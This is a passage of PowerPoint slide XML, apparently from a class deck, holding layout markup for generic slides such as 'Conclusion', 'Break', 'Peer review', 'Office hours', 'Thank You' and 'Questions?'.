        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="134" name="Google Shape;134;p20"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3684112" y="1371590"/>
            <a:ext cx="1776025" cy="132463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Conclusion">
  <p:cSld name="CUSTOM_26_1_1_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="135" name="Shape 135"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="136" name="Google Shape;136;p21"/>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b="1" lang="en" sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:rPr>
              <a:t>Conclusion</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="4000">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="137" name="Google Shape;137;p21"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4048275" y="1452275"/>
            <a:ext cx="1047450" cy="12091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s up! Let's review">
  <p:cSld name="CUSTOM_10_2_1_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="138" name="Shape 138"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="139" name="Google Shape;139;p22"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3856863" y="1371602"/>
            <a:ext cx="1430525" cy="1376700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="140" name="Google Shape;140;p22"/>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Time’s </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>U</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en" sz="4000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>p!</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="141" name="Google Shape;141;p22"/>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Let’s review</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reak">
  <p:cSld name="CUSTOM_10_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="142" name="Shape 142"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="143" name="Google Shape;143;p23"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3861200" y="1371599"/>
            <a:ext cx="1421602" cy="1376700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="144" name="Google Shape;144;p23"/>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Break</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="145" name="Google Shape;145;p23"/>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15 mins</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 for a quick review">
  <p:cSld name="CUSTOM_10_1_1_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="146" name="Shape 146"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="147" name="Google Shape;147;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3722162" y="1448847"/>
            <a:ext cx="1699675" cy="1224853"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="148" name="Google Shape;148;p24"/>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for a quick video</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Peer review">
  <p:cSld name="CUSTOM_10_1_1_1_3">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="149" name="Shape 149"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="150" name="Google Shape;150;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3926225" y="1453000"/>
            <a:ext cx="1291550" cy="1291550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="151" name="Google Shape;151;p2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Peer review</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Let's recap">
  <p:cSld name="CUSTOM_10_1_1_1_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="152" name="Shape 152"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="153" name="Google Shape;153;p26"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3926225" y="1435359"/>
            <a:ext cx="1291550" cy="1326833"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="154" name="Google Shape;154;p26"/>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Let’s recap</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Office hours">
  <p:cSld name="CUSTOM_10_1_1_1_2_3_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="155" name="Shape 155"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="156" name="Google Shape;156;p27"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3492850" y="1583850"/>
            <a:ext cx="2158300" cy="1138725"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="157" name="Google Shape;157;p27"/>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Office hours</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="158" name="Google Shape;158;p2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Slack slide">
  <p:cSld name="CUSTOM_10_1_1_1_2_3_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="159" name="Shape 159"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="160" name="Google Shape;160;p28"/>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Class Slack Channel:</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="161" name="Google Shape;161;p2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pic>
        <p:nvPicPr>
          <p:cNvPr id="162" name="Google Shape;162;p28"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="24412" l="9534" r="69121" t="23790"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3876275" y="1390350"/>
            <a:ext cx="1391451" cy="138252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hank you">
  <p:cSld name="CUSTOM_10_1_1_1_2_1_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="163" name="Shape 163"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="Google Shape;164;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3073400"/>
            <a:ext cx="9144000" cy="7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Thank </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="4000">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Y</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en" sz="4000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>ou</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="165" name="Google Shape;165;p29"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3883775" y="1371600"/>
            <a:ext cx="1376700" cy="13767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Questions">
  <p:cSld name="CUSTOM_10_1_1_1_1_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="166" name="Shape 166"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167" name="Google Shape;167;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3054950"/>
            <a:ext cx="9144000" cy="7524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Questions?</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="168" name="Google Shape;168;p30"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3726873" y="1589513"/>
            <a:ext cx="1690255" cy="1324800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="169" name="Google Shape;169;p30"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="9853" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="653025" y="4126875"/>
            <a:ext cx="870750" cy="1194250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="170" name="Google Shape;170;p30"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="19664" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1651350" y="4364000"/>
            <a:ext cx="783075" cy="957125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="171" name="Google Shape;171;p30"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="30598" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3638200" y="4387525"/>
            <a:ext cx="712575" cy="752400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="172" name="Google Shape;172;p30"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="9853" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2655487" y="3973275"/>
            <a:ext cx="982713" cy="1347850"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="173" name="Google Shape;173;p30"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="9853" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4517888" y="4134937"/>
            <a:ext cx="870750" cy="1194250"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="174" name="Google Shape;174;p30"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="5686" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5979175" y="4168652"/>
            <a:ext cx="783075" cy="1123675"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="175" name="Google Shape;175;p30"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7223650" y="3973275"/>
            <a:ext cx="870750" cy="13248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C - Instructor Demonstration">
  <p:cSld name="CUSTOM_10_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="dk2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="176" name="Shape 176"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177" name="Google Shape;177;p31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3772475"/>
            <a:ext cx="9144000" cy="461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accent2"/>
              </a:buClr>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr sz="2800">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl8pPr>
